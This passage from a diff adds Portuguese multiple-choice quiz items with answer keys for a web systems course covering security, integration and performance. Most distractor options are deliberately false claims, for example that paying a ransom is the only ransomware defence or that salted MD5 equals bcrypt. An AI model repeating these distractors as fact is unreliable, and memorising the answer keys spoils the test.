+      "HttpOnly impede que JavaScript leia o cookie (barra o roubo por XSS); Secure só envia o cookie por HTTPS (evita captura na rede); SameSite bloqueia o envio em requisições de outros sites (barra CSRF).",
+      "Só HttpOnly importa: bancos já usam HTTPS, e SameSite atrapalha links de e-mail.",
+      "SameSite é a única flag que realmente previne ataques: HttpOnly não impede XSS pois o código malicioso pode usar outros vetores além de document.cookie para capturar sessões, e Secure é ineficaz porque atacantes modernos conseguem fazer downgrade de HTTPS para HTTP através de ataques SSL stripping — apenas SameSite resolve o problema fundamental de autenticação cross-origin em aplicações bancárias modernas."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa sofreu ataque de ransomware que criptografou todos os arquivos do servidor, incluindo os backups armazenados no mesmo servidor. O CEO pergunta por que os backups não salvaram a situação. Qual é a lição de segurança e como implementar backups efetivos?",
+    "alternativas": [
+      "O problema foi a frequência dos backups: backups diários não são suficientes para proteger contra ransomware — empresas que precisam de proteção real devem fazer backups a cada 15 minutos usando sistemas de snapshot em tempo real; o local de armazenamento é irrelevante para proteção contra ransomware pois o que importa é ter versões recentes do dado antes da criptografia.",
+      "Backup no mesmo servidor é criptografado junto; ele precisa ficar isolado (nuvem externa, outro provedor ou mídia offline), de preferência imutável, e a restauração deve ser testada com frequência.",
+      "Backups nunca protegem contra ransomware moderno: algoritmos como AES-256 e RSA conseguem localizar e criptografar automaticamente qualquer backup independentemente de onde esteja armazenado, incluindo serviços de nuvem, servidores remotos e mídias físicas offline — a única proteção real é pagar o resgate rapidamente antes que os atacantes aumentem o valor exigido ou destruam definitivamente as chaves de descriptografia.",
+      "O problema foi a ausência de antivírus: se o servidor tivesse antivírus atualizado, o ransomware seria detectado antes de executar e os backups locais seriam suficientes para recuperação — antivírus modernos com detecção comportamental bloqueiam 100% das variantes conhecidas de ransomware em menos de 30 segundos após o início da execução, tornando backups externos uma medida desnecessariamente cara para a maioria das empresas."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor argumenta: \"Não preciso me preocupar com CSRF porque minha API usa JSON e browsers só enviam JSON com requisições AJAX que incluem o header Origin, não com formulários simples.\" Esse argumento está correto?",
+    "alternativas": [
+      "O argumento está completamente correto e é reconhecido como mitigação suficiente pelo OWASP: APIs JSON puras são imunes a CSRF por design pois a política de same-origin bloqueia JavaScript de outros domínios de ler as respostas — a proteção por tokens CSRF é necessária apenas para aplicações que processam dados de formulários HTML tradicionais com Content-Type application/x-www-form-urlencoded.",
+      "É incompleto: JSON entre origens exige preflight, mas um CORS permissivo (Access-Control-Allow-Origin: *) ou APIs que aceitam text/plain abrem brecha; tokens CSRF, SameSite e checagem do Origin formam defesa em camadas.",
+      "Está errado: APIs JSON são mais vulneráveis a CSRF do que formulários HTML comuns.",
+      "CSRF não é uma ameaça relevante para APIs modernas independentemente do formato de dados: o ataque foi relevante apenas na era dos formulários HTML dos anos 2000 — com arquiteturas SPA (Single Page Application) e tokens JWT armazenados em localStorage ao invés de cookies, o vetor de ataque CSRF foi completamente eliminado; desenvolvedores que ainda implementam tokens CSRF em 2025 estão adicionando complexidade desnecessária sem benefício de segurança real."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe de segurança usa OWASP ZAP em modo automático e não encontra vulnerabilidades. O líder conclui que a aplicação está segura. Por que essa conclusão é precipitada e como o Burp Suite complementa essa análise?",
+    "alternativas": [
+      "Está correta: o ZAP basta, e o Burp Suite faz exatamente as mesmas verificações.",
+      "Scanners acham padrões conhecidos, mas não falhas de lógica de negócio, como preço negativo ou etapa de aprovação pulada; no Burp Suite (Repeater, Intruder), o pentester manipula requisições e encontra o que a automação não vê.",
+      "O problema é que OWASP ZAP é uma ferramenta amadora inadequada para aplicações corporativas: Burp Suite Professional deve substituir completamente o ZAP pois suas varreduras automáticas são superiores e cobrem 100% das vulnerabilidades do OWASP Top 10 sem necessidade de testes manuais adicionais — a combinação das duas ferramentas é recomendada apenas para estudantes que estão aprendendo segurança e não possuem orçamento para Burp Suite.",
+      "A conclusão é precipitada apenas se a aplicação tiver banco de dados: ZAP automaticamente encontra todas as vulnerabilidades de interface (XSS, CSRF, headers de segurança) mas não consegue testar SQL injection sem acesso direto ao banco — configurar Burp Suite com credenciais de banco de dados resolve essa limitação e completa a cobertura de segurança sem necessidade de testes manuais adicionais pelo pentester."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa recebe email aparentemente do CEO solicitando transferência urgente de R$ 500.000 para \"fechar um contrato\". O endereço de email parece legítimo: ceo@empresa.com.br. Como SPF, DKIM e DMARC poderiam ter protegido contra esse ataque e por que a aparência legítima não é suficiente?",
+    "alternativas": [
+      "SPF, DKIM e DMARC não protegem contra esse ataque pois o email usa o domínio real da empresa: esses registros DNS só funcionam contra emails de domínios externos que tentam se passar pela empresa — quando um atacante compromete a conta real do CEO ou usa o domínio legítimo, os três mecanismos de autenticação são contornados completamente sem possibilidade de detecção.",
+      "SPF diz quais servidores podem enviar pelo domínio; DKIM assina a mensagem; DMARC manda rejeitar o que falha nesses testes, mesmo com o From correto; a aparência é justamente o que o spoofing falsifica.",
+      "Só o DMARC funciona, e sozinho dispensa SPF e DKIM, bloqueando 100% dos casos.",
+      "SPF, DKIM e DMARC protegem apenas contra spam genérico, não contra spear phishing direcionado: atacantes profissionais que realizam BEC (Business Email Compromise) no valor de R$ 500.000 sempre usam técnicas avançadas que contornam todos os filtros de email — a única proteção efetiva é treinamento humano e processos de verificação telefônica obrigatória para transferências acima de determinado valor, independentemente de qualquer tecnologia de autenticação de email."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup mede apenas o número de incidentes de segurança mensais como KPI e está satisfeita porque o número caiu de 50 para 5 no último trimestre. O CISO questiona essa métrica isolada. Por que ela pode ser enganosa e quais KPIs complementares são essenciais?",
+    "alternativas": [
+      "A redução de 50 para 5 incidentes é inequivocamente positiva e valida que o programa de segurança está funcionando: o número total de incidentes é a métrica mais objetiva e confiável disponível — adicionar outros KPIs cria ruído desnecessário que dificulta a tomada de decisão pela gestão que precisa de indicadores simples e diretos para avaliar o retorno sobre o investimento em segurança.",
+      "Menos incidentes pode ser melhora ou detecção pior; faltam o MTTD (tempo para detectar), a taxa de correções aplicadas e a adoção de MFA, ou a empresa terá falsa sensação de segurança.",
+      "O CISO está errado em questionar a métrica: número de incidentes é reconhecido pelo NIST, ISO 27001 e OWASP como o KPI primário mais importante para programas de segurança — frameworks internacionais recomendam que empresas foquem em um único KPI de alta qualidade ao invés de múltiplas métricas que podem apresentar dados conflitantes e confundir a tomada de decisão executiva.",
+      "O problema é que 5 incidentes mensais ainda é um número alto: empresas maduras em segurança têm zero incidentes por mês — o CISO deveria questionar por que a redução parou em 5 e não chegou a zero, e o único KPI complementar necessário é a taxa de recorrência de incidentes do mesmo tipo, que indica se as correções implementadas foram realmente efetivas ou apenas superficiais."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma aplicação web armazena senhas em MD5 sem salt. Um atacante obtém o banco de dados e usa uma rainbow table para descobrir as senhas em minutos. Por que MD5 sem salt é inadequado e como bcrypt ou Argon2 resolvem esses dois problemas específicos?",
+    "alternativas": [
+      "Basta aplicar o MD5 três vezes seguidas, o que já impede as rainbow tables.",
+      "O MD5 é rápido (força bruta em GPU) e, sem salt, a mesma senha gera o mesmo hash (rainbow tables); bcrypt tem custo ajustável e salt por senha, e o Argon2 ainda exige memória, dificultando hardware especializado.",
+      "O problema do MD5 é exclusivamente a ausência de salt: adicionar um salt aleatório ao MD5 o torna tão seguro quanto bcrypt ou Argon2 para qualquer aplicação prática — a diferença entre os algoritmos é apenas de padronização e compatibilidade com diferentes frameworks; MD5 com salt bem implementado é aprovado por auditorias PCI-DSS e pode ser usado em sistemas de pagamento sem necessidade de migrar para algoritmos mais modernos.",
+      "Rainbow tables não são uma ameaça real em 2025: o volume de dados necessário para armazenar rainbow tables para senhas modernas (acima de 8 caracteres com caracteres especiais) tornaria o ataque inviável mesmo para estados nacionais — o verdadeiro problema do MD5 é ser vulnerável a colisões que permitem criar certificados digitais falsos; bcrypt e Argon2 são resistentes a colisões mas sua adoção para senhas é baseada em tradição histórica, não em vantagem técnica mensurável sobre MD5 com salt para esse caso de uso específico."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa possui 8 sistemas que precisam se comunicar entre si usando integração ponto a ponto. Após adquirir mais 2 sistemas, o gerente percebe que a manutenção ficou inviável. Quantas conexões existiam antes e quantas existem agora, e qual é a conclusão arquitetural correta?",
+    "alternativas": [
+      "Antes havia 8 conexões e depois 10, o aumento é linear e gerenciável; a integração ponto a ponto continua sendo a melhor escolha pois cada nova conexão representa apenas um sistema adicional sem impacto exponencial na complexidade da arquitetura.",
+      "Eram 16 e passam a 20; um hub só se justifica acima de 20 sistemas.",
+      "Por n×(n−1)/2: eram 28 conexões e passam a 45, 17 a mais por só 2 sistemas; é a \"arquitetura espaguete\", que justifica um hub ou middleware.",
+      "Antes havia 28 conexões e depois 45, mas a solução correta é adotar integração baseada em eventos em vez de hub/middleware — eventos eliminam completamente o problema de conexões múltiplas pois sistemas nunca precisam se conhecer diretamente em nenhuma arquitetura orientada a eventos."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap6-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema de e-commerce publica o evento \"PedidoFinalizado\" e os sistemas de estoque, nota fiscal e logística reagem automaticamente. O desenvolvedor quer adicionar um novo sistema de fidelidade que também precisa reagir a esse evento. Qual é a principal vantagem da integração baseada em eventos nesse cenário?",
+    "alternativas": [
+      "A principal vantagem é a performance: eventos são processados mais rapidamente que chamadas diretas pois são assíncronos, e o sistema de fidelidade receberá a notificação em microssegundos independentemente do volume de pedidos simultâneos.",
+      "O sistema de vendas não muda: o de fidelidade só se inscreve no evento; o desacoplamento deixa incluir consumidores sem mexer no publicador.",
+      "A principal vantagem é a simplicidade de implementação: sistemas baseados em eventos são mais fáceis de desenvolver do que integrações ponto a ponto ou via hub, pois requerem apenas que o novo sistema faça uma chamada HTTP direta ao barramento de mensagens existente.",
+      "A principal vantagem é a garantia de entrega: em arquiteturas orientadas a eventos, o barramento garante que cada evento será processado exatamente uma vez por cada sistema inscrito, eliminando completamente os riscos de duplicação ou perda de mensagens sem qualquer configuração adicional."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup integra a API do Stripe para pagamentos e a API do Google Maps para entregas. Seis meses depois, o Stripe anuncia mudança no formato de sua API com breaking changes. Qual prática preventiva minimizaria o impacto dessa situação?",
+    "alternativas": [
+      "A melhor prática é nunca usar APIs de terceiros para funcionalidades críticas como pagamento — desenvolver um gateway próprio elimina a dependência externa e garante controle total sobre mudanças, sendo o investimento inicial compensado pela estabilidade a longo prazo.",
+      "Adotar cada breaking change logo que for anunciada, antes de todo mundo.",
+      "Fixar a versão da API nas chamadas, acompanhar avisos de depreciação e criar uma camada interna de abstração, para que uma mudança no Stripe afete só essa camada.",
+      "A melhor prática é configurar atualização automática para sempre usar a versão mais recente da API — versões antigas são eventualmente descontinuadas, e manter-se sempre na última versão garante acesso aos recursos mais novos e elimina o risco de incompatibilidade com breaking changes futuros."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap6-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor armazena sua API key do Google Maps diretamente no código JavaScript do frontend de sua aplicação. Um colega alerta sobre o risco. Qual é o problema específico e qual é a solução correta?",
+    "alternativas": [
+      "Performance: a chave aumenta o bundle; basta minificar o código para escondê-la.",
+      "A chave fica visível para quem inspecionar o JavaScript e pode ser usada por terceiros, gerando custos; o certo é guardá-la em variável de ambiente no backend e chamar a API pelo servidor.",
+      "O problema é de escalabilidade: chamadas à API do Google Maps feitas pelo frontend criam gargalo no cliente — a solução é centralizar todas as chamadas no backend independentemente de questões de segurança, pois o backend tem capacidade de processamento superior ao navegador do usuário.",
+      "Não há problema real em armazenar API keys no frontend moderno: navegadores atuais criptografam automaticamente o código JavaScript, tornando impossível para usuários externos ler strings de autenticação embutidas; o alerta do colega é baseado em práticas desatualizadas que não se aplicam a aplicações com HTTPS habilitado."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma API RESTful de uma loja virtual retorna o status 422 ao tentar criar um pedido. O desenvolvedor recebe esse código e não sabe distingui-lo de um 400. Qual é a diferença semântica entre eles e qual o tratamento adequado para cada um?",
+    "alternativas": [
+      "Não há diferença semântica relevante entre 400 e 422 — ambos indicam erro do cliente e devem ser tratados da mesma forma: exibir mensagem genérica de erro e solicitar que o usuário tente novamente; a distinção entre eles é apenas histórica sem impacto prático no tratamento de respostas.",
+      "400: requisição malformada (JSON quebrado, campo faltando), corrige-se a requisição; 422: formato certo, mas regra de negócio violada (sem estoque, sem limite), resolve-se a condição.",
+      "400 é erro de autenticação, e 422, de autorização.",
+      "422 é mais grave que 400 e indica que o servidor está com problemas para processar qualquer requisição — quando uma API retorna 422, a aplicação deve implementar circuit breaker imediatamente para parar de enviar requisições até que o servidor se recupere, similar ao tratamento de erros 5xx."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma aplicação usa OAuth 2.0 para permitir que usuários conectem suas contas do Google. Um desenvolvedor propõe substituir pelo modelo de API Key por ser \"mais simples\". Por que essa substituição seria inadequada nesse contexto específico?",
+    "alternativas": [
+      "API Keys são tecnicamente superiores ao OAuth 2.0 para autenticação de usuários: são mais rápidas, não requerem redirecionamentos e podem ser geradas instantaneamente — a complexidade do OAuth 2.0 é justificada apenas quando há mais de 10.000 usuários simultâneos, não para aplicações de pequeno porte.",
+      "A substituição é inadequada apenas por questões regulatórias: a LGPD exige OAuth 2.0 para qualquer integração com serviços de identidade externos — APIs Keys são proibidas por lei para esse caso de uso específico, independentemente das preferências técnicas da equipe de desenvolvimento.",
+      "O OAuth 2.0 existe para isso: o usuário autoriza o acesso sem entregar a senha do Google; a autenticação fica com o Google, e as permissões podem ser revogadas.",
+      "A substituição é inadequada por questões de custo: o Google cobra por integrações via API Key mas oferece OAuth 2.0 gratuitamente — a escolha técnica não tem relevância nesse caso, sendo a decisão puramente financeira; equipes com orçamento limitado devem sempre usar OAuth 2.0 para reduzir custos operacionais."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap6-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema de delivery usa integração ponto a ponto com 5 parceiros de pagamento diferentes (PicPay, PagSeguro, Stripe, Mercado Pago e PayPal). Cada parceiro muda seu formato de dados periodicamente. Qual padrão arquitetural de integração resolveria melhor esse problema de manutenção?",
+    "alternativas": [
+      "Eventos: cada parceiro publica no barramento, e nenhum código específico é necessário.",
+      "Um hub com adaptadores por parceiro: se o PagSeguro muda, só o adaptador dele é atualizado, e o delivery não é tocado; o hub também centraliza o monitoramento.",
+      "A melhor solução é padronizar os 5 parceiros para usarem o mesmo formato de dados antes de integrar — APIs de pagamento maduras como as listadas certamente oferecem endpoints customizáveis que permitem ao contratante definir o formato de dados desejado, eliminando o problema de transformação no lado da aplicação.",
+      "Integração ponto a ponto com abstração em código é suficiente: criar uma interface genérica de pagamento no código com implementações específicas para cada parceiro resolve o problema de manutenção sem necessidade de middleware externo — padrões de design como Strategy ou Adapter eliminam completamente a necessidade de hub centralizado."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "O Netflix analisa que usuários que assistem documentários de natureza às sextas-feiras também tendem a assistir filmes de aventura nos sábados. Um novo usuário assiste seu primeiro documentário de natureza numa sexta. Qual técnica de sistema de recomendação está sendo aplicada e como ela funciona?",
+    "alternativas": [
+      "Está sendo aplicada filtragem baseada em conteúdo: o sistema analisa as características intrínsecas do documentário assistido (gênero, duração, temática) e recomenda outros conteúdos com características similares, sem considerar o comportamento de outros usuários na plataforma.",
+      "Filtragem colaborativa: o sistema acha usuários com comportamento parecido e usa o histórico deles para prever o que o novo usuário vai gostar (\"quem é como você também gostou\").",
+      "Está sendo aplicado machine learning supervisionado: o sistema foi treinado com pares de entrada/saída (documentário na sexta → aventura no sábado) e agora classifica novos usuários em categorias predefinidas, recomendando o conteúdo da categoria correspondente sem considerar similaridade com outros usuários.",
+      "Monitoramento em tempo real com Datadog, que dispara sugestões na hora."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma aplicação web usa AJAX para atualizar o feed de notícias sem recarregar a página. O usuário curte uma publicação e o coração muda de cor instantaneamente, mas o servidor retorna erro 500 alguns segundos depois. Como essa arquitetura deveria tratar essa situação corretamente?",
+    "alternativas": [
+      "A tela nunca deve mudar antes da resposta; fazer isso é enganar o usuário.",
+      "É o optimistic update: a tela muda na hora, mas, se vier o erro 500, a curtida deve ser desfeita na tela, o usuário avisado e o envio tentado de novo.",
+      "O erro 500 deve ser silenciosamente ignorado nesse contexto: curtidas são interações de baixa criticidade onde a consistência eventual é aceitável — o usuário verá o coração colorido e o sistema eventualmente processará a curtida quando o servidor se recuperar, sem necessidade de qualquer feedback ou reversão visual.",
+      "A aplicação deve recarregar a página completa ao receber qualquer erro 500: recarregamentos são a forma mais segura de garantir que a interface reflete o estado real do servidor — tecnologias como AJAX e Fetch API são inadequadas para operações críticas como curtidas que exigem consistência absoluta entre frontend e backend."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap6-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap6",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe analisa os dados do Google Analytics e percebe que 70% dos usuários abandonam o site na página de checkout após adicionar produtos ao carrinho. O gerente propõe adicionar mais produtos para aumentar as vendas. Qual é a interpretação correta dos dados e qual ação deveria ser recomendada?",
+    "alternativas": [
+      "O gerente está correto: mais produtos aumentam o ticket médio e compensam matematicamente a taxa de abandono — se 30% dos usuários finalizam a compra com o catálogo atual, ampliar as opções aumentaria o número absoluto de conversões mesmo mantendo a taxa de abandono de 70%.",
+      "Os dados indicam problema de marketing: 70% de abandono no checkout significa que os usuários chegam ao site por anúncios irrelevantes que não refletem o que realmente querem comprar — a solução é revisar as campanhas de aquisição de tráfego, não a experiência da página de checkout.",
+      "O abandono acontece no próprio checkout, depois do carrinho: indica formulário longo, poucas formas de pagamento, frete revelado tarde ou desconfiança; o certo é otimizar o checkout.",
+      "Os dados são insuficientes para qualquer conclusão: taxa de abandono de checkout de 70% é considerada normal e esperada pelo setor de e-commerce — benchmarks internacionais indicam que 65-75% de abandono é a média global, e a equipe não deveria tomar nenhuma ação corretiva pois o desempenho está dentro dos parâmetros aceitos pela indústria."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap7-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um e-commerce registra LCP de 4,2 segundos, FCP de 2,1 segundos e CLS de 0,08 em dispositivos móveis. O desenvolvedor afirma que o CLS está bom e foca apenas no FCP. Qual é a análise correta das métricas e qual deveria ser a prioridade de otimização?",
+    "alternativas": [
+      "O desenvolvedor está correto: FCP de 2,1 segundos é o maior problema pois é a primeira impressão do usuário — CLS e LCP são métricas secundárias que só precisam ser otimizadas após o FCP atingir o ideal de 1,8 segundos, conforme hierarquia de prioridade do Google Lighthouse.",
+      "O LCP: 4,2 s está bem acima do ideal de 2,5 s e mede quando o conteúdo principal aparece; o FCP (2,1 s) está um pouco acima de 1,8 s, e o CLS (0,08) já está dentro do limite de 0,1.",
+      "As três estão aceitáveis para mobile, que tem padrões próprios; nada é urgente.",
+      "O CLS deveria ser a prioridade máxima apesar de estar abaixo de 0,1: em e-commerce, qualquer deslocamento de layout próximo ao botão de compra pode causar cliques acidentais com consequências financeiras para o usuário — o limite de 0,1 do Google não considera o impacto de negócio de layouts instáveis em páginas de conversão."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema bancário apresenta TTFB de 950ms. O desenvolvedor investiga e encontra que 400ms são de DNS lookup, 200ms de SSL handshake e 350ms de processamento no servidor. Qual é a conclusão correta e quais otimizações atacam cada componente?",
+    "alternativas": [
+      "O único problema é o certificado SSL; renová-lo para TLS 1.3 resolve tudo.",
+      "Os 950 ms passam do ideal de 600 ms: o DNS (400 ms) melhora com prefetch e TTL adequado; o handshake (200 ms), com TLS 1.3 e retomada de sessão; e o processamento (350 ms), com queries, cache e código otimizados.",
+      "O processamento de 350ms é o único componente que a equipe pode controlar: DNS e SSL são gerenciados por provedores externos e não podem ser otimizados pela equipe de desenvolvimento — a solução é focar exclusivamente na otimização do backend e aceitar os 600ms de overhead de rede como constante imutável.",
+      "O TTFB de 950ms é aceitável para sistemas bancários: aplicações financeiras com SSL/TLS têm overhead de segurança que justifica tempos de resposta mais altos — o ideal de 600ms se aplica apenas a sites estáticos e e-commerces, não a sistemas com requisitos regulatórios de segurança que exigem múltiplas camadas de autenticação."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup define seu SLO de disponibilidade em 99,9%. Durante um mês de 30 dias, o sistema ficou indisponível por 52 minutos. O CEO pergunta se o SLO foi cumprido e se novos deploys podem continuar. Qual é a análise correta?",
+    "alternativas": [
+      "O SLO foi cumprido com folga: 99,9% de disponibilidade em 30 dias equivale a 43,2 minutos de downtime permitido, e 52 minutos representa 99,88% de uptime — a diferença é marginal e dentro da variação estatística aceitável, portanto novos deploys podem continuar normalmente.",
+      "Foi violado: 99,9% em 30 dias permite cerca de 43 minutos fora do ar, e foram 52; o error budget estourou, e pela prática de SRE os deploys de novidades param até a confiabilidade melhorar.",
+      "O SLO foi cumprido: 52 minutos representa 99,879% de uptime que é tecnicamente superior a 99,8% — como o SLO define apenas o piso mínimo de 99,9%, qualquer resultado acima de 99,0% deve ser considerado aprovado sem impacto no Error Budget ou na política de deploys.",
+      "A decisão sobre novos deploys é independente do SLO: Error Budget é um conceito teórico de engenharia de confiabilidade sem impacto prático nas decisões de negócio — o CEO deve decidir se deploys continuam com base em prioridades comerciais, não em cálculos de disponibilidade que representam menos de 1 hora de diferença no mês."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma aplicação Node.js apresenta uso de memória crescendo continuamente de 200MB para 800MB ao longo de 12 horas sem reinicialização, enquanto CPU permanece estável. Qual é o diagnóstico correto e quais ferramentas identificam a causa raiz?",
+    "alternativas": [
+      "O crescimento de memória é comportamento normal do Node.js: o runtime JavaScript usa garbage collection incremental que acumula objetos na heap antes de liberar — o pico de 800MB será automaticamente reduzido pelo GC quando atingir o limite configurado, sem necessidade de investigação adicional.",
+      "É vazamento de memória: a memória só cresce, com CPU estável, porque objetos seguem referenciados e o garbage collector não os libera; heap dumps (Chrome DevTools, --inspect) e monitoramento mostram o que acumula.",
+      "O problema é de connection pooling mal configurado: pools de conexão de banco de dados abertos sem fechamento adequado causam crescimento linear de memória — a solução é revisar a configuração máxima do pool e implementar timeout para conexões ociosas, sem necessidade de análise de heap ou profiling.",
+      "Falta RAM: basta subir o servidor de 1 GB para 4 GB."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe usa Prometheus + Grafana para monitoramento. Um alerta dispara indicando que a taxa de erro ultrapassou 2% por mais de 5 minutos. O desenvolvedor de plantão acessa o Grafana e vê picos simultâneos de latência de banco de dados (250ms) e CPU em 85%. Como correlacionar essas métricas para diagnóstico eficiente?",
+    "alternativas": [
+      "As métricas são independentes e devem ser investigadas em paralelo por duas equipes diferentes: um time analisa o banco de dados e outro analisa a CPU simultaneamente — correlacionar métricas de fontes diferentes no Grafana é tecnicamente impossível sem exportação para ferramentas de análise dedicadas como Excel ou Tableau.",
+      "O banco lento é a causa provável: queries de 250 ms prendem threads esperando resposta e elevam a CPU a 85%; o diagnóstico começa pelo slow query log, pelos planos de execução e pelo pool de conexões.",
+      "CPU em 85% é a causa raiz e banco de dados é consequência: quando CPU está alta, queries demoram mais para processar resultados — a solução correta é escalar verticalmente o servidor primeiro, e só depois investigar o banco de dados caso a CPU normalizada não resolva a latência de 250ms.",
+      "É um ataque DDoS: ative o rate limiting e bloqueie IPs antes de investigar."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema de delivery processa pedidos de forma síncrona: cada pedido aguarda confirmação do parceiro logístico antes de responder ao usuário (latência média de 3 segundos). No horário do almoço, o RPS cai de 500 para 50 e a taxa de erro sobe para 15%. Qual padrão arquitetural resolveria esse problema de escalabilidade?",
+    "alternativas": [
+      "Escalar verticalmente: mais CPU e memória eliminam o gargalo síncrono.",
+      "Uma fila de mensagens: o pedido é enfileirado e o usuário recebe a confirmação na hora, enquanto um worker fala com a logística em segundo plano; as threads não ficam presas 3 segundos, e o sistema aguenta o pico.",
+      "Load balancing resolve o problema: distribuir as requisições entre 10 servidores idênticos dividiria a carga de forma que cada servidor processaria apenas 5 RPS em vez de 50 — isso reduziria a latência de 3 segundos proporcionalmente e eliminaria os erros sem necessidade de mudanças arquiteturais no fluxo de processamento síncrono.",
+      "Auto scaling é a solução adequada: configurar o AWS Auto Scaling para adicionar instâncias quando o RPS cair abaixo de 100 detectaria automaticamente o problema do horário do almoço e adicionaria servidores antes que a taxa de erro aumentasse — sistemas modernos em nuvem com auto scaling não precisam de message queues para lidar com picos de demanda síncrona."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor usa Chrome DevTools Performance e identifica uma função JavaScript que aparece em vermelho no flame chart com duração de 180ms, executando durante um scroll. Qual é o impacto dessa long task e como ela afeta as métricas Core Web Vitals?",
+    "alternativas": [
